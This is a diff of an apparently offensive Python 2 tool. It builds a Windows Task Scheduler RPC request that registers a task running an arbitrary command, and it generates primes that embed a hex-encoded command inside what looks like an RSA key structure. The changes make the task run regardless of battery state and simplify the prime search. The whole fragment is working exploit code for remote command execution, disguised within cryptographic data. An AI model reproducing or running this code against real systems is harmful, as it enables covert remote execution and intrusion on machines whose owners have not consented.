@@ -33,18 +33,24 @@ def createCmd(domain, user, path):
         req['pCreds'][0]['userId']=u'%s\\%s\x00' % (domain,user)
     else:
         req['pCreds'][0]['userId']=u'%s\x00' % (user)
-    x = u"""
-<?xml version="1.0"?>
-  <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    x=u"""<?xml version="1.0"?>
+    <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
     <Triggers>
-      <RegistrationTrigger/>
+    <RegistrationTrigger/>
     </Triggers>
+    <Settings>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+    </IdleSettings>
+    </Settings>
     <Actions>
-      <Exec>
-        <Command>%s</Command>
-      </Exec>
+    <Exec>
+    <Command>%s</Command>
+    </Exec>
     </Actions>
-  </Task>\x00""" % (path)
+    </Task>\x00""" % (path)
     req.fields['path']["ReferentID"]= int(('3082010a02820101'),16)
     req['xml'] = x.replace('\n    ','') #notice the padding
     s=str(req)#
@@ -63,34 +69,29 @@ def dump_req(req,s):
     print >> sys.stderr, str(len(s[8:]))
 
 def gen(cmd):
-    condStr=cmd # the cmd should be in hex string already
-
+    condStr=cmd # the cmd should be in hex string already 
+    next=-1
     while True:
-        next=random.randrange(2**(FREEDOMBITS))
+        next+=2#random.randrange(2**(FREEDOMBITS))
         cond=int(condStr+ INCBY*"00",16) + next
         if cond&1==1:
             yield cond
 
 def findPrime(cmd,e):
-    ll = []
     numgen = gen(cmd)
     tries = 0
-    a = datetime.datetime.now()
     while True:
-        tries += 1
-        if tries%10 == 0:
-            if len(ll) > 1:
-                sys.stderr.write(str(float(sum(ll)) / len(ll)) + "|" + str(tries) + " ")
-            b = datetime.datetime.now()
-            diff = b - a
-            ll += [diff.total_seconds()]
-            a = b
-        num = numgen.next()
+        tries+=1
+
+        if tries%50 ==0:
+            print >> sys.stderr, ("Tried "+str(tries)+" primes...")
+
+        num=numgen.next()
         if isPrime(num):
             eg=egcd(num-1,e)
             d=eg[2] % (num-1)
             if eg[0]!=1: #gcd
-                print >> sys.stderr, ("\nbad gcd. what are the odds?") # this also means that it is not prime
+                print >> sys.stderr, ("bad gcd. what are the odds?") # this also means that it is not prime
                 continue
 
             return num, d
